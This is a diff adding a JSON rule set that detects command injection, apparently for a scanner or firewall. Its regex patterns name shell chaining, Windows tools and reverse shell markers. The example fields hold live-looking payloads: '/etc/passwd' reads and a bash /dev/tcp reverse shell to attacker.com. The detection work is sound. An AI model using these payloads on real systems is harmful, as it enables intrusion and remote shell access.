@@ -1,0 +1,49 @@
+{
+  "category": "Command Injection",
+  "category_id": "cmdi",
+  "severity": "CRITICAL",
+  "score": 90,
+  "description": "Command injection attacks execute arbitrary OS commands on the server by injecting shell metacharacters into inputs that are passed to system commands.",
+  "rules": [
+    {
+      "id": "CMDI-001",
+      "name": "Shell Command Chaining",
+      "pattern": "[|;&`$]\\s*(ls|id|whoami|pwd|cat|echo|curl|wget|nc|bash|sh|python|perl|ruby|php|nmap|ifconfig|uname|hostname|ps|kill|rm|cp|mv|chmod|chown)",
+      "description": "Detects pipe/semicolon/backtick chaining with common Unix commands",
+      "example": "127.0.0.1; cat /etc/passwd",
+      "score_modifier": 1.5
+    },
+    {
+      "id": "CMDI-002",
+      "name": "Command Substitution",
+      "pattern": "(\\$\\([^)]+\\)|`[^`]+`)",
+      "description": "Detects $() and backtick command substitution",
+      "example": "$(cat /etc/passwd) or `id`",
+      "score_modifier": 1.4
+    },
+    {
+      "id": "CMDI-003",
+      "name": "Windows Shell Commands",
+      "pattern": "(cmd\\.exe|powershell(\\.exe)?|wscript|cscript|mshta|certutil|bitsadmin|wmic)",
+      "description": "Detects Windows command execution tools",
+      "example": "cmd.exe /c dir C:\\",
+      "score_modifier": 1.5
+    },
+    {
+      "id": "CMDI-004",
+      "name": "Reverse Shell Patterns",
+      "pattern": "(bash\\s+-i|nc\\s+-e|/dev/tcp/|mkfifo|\\btelnet\\b.*\\|.*sh)",
+      "description": "Detects common reverse shell patterns",
+      "example": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+      "score_modifier": 2.0
+    },
+    {
+      "id": "CMDI-005",
+      "name": "Privilege Escalation Paths",
+      "pattern": "(/bin/(bash|sh|dash|zsh|ksh)|/usr/bin/(python|perl|ruby|php|node))",
+      "description": "Detects references to Unix shell and scripting language binaries",
+      "example": "/bin/bash -c 'id'",
+      "score_modifier": 1.2
+    }
+  ]
+}
